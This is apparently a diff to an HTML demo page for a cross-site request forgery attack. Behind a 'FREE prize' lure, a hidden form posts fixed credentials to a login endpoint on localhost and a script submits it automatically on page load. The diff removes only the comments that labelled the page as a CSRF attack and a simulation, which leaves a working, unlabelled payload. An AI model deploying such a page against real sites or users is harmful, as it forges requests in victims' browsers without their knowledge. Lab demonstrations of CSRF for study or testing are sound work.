@@ -6,7 +6,6 @@
 <body>
 <h1>Click here to get your FREE prize!</h1>
 
-<!-- CSRF Attack -->
 <form action="http://localhost:8081/login" method="POST" style="display: none;">
     <input type="text" name="username" value="hacker">
     <input type="password" name="password" value="123456">
@@ -14,7 +13,6 @@
 </form>
 
 <script>
-    // Automatically submit the form when page loads (simulating attack)
     document.forms[0].submit();
 </script>
 </body>
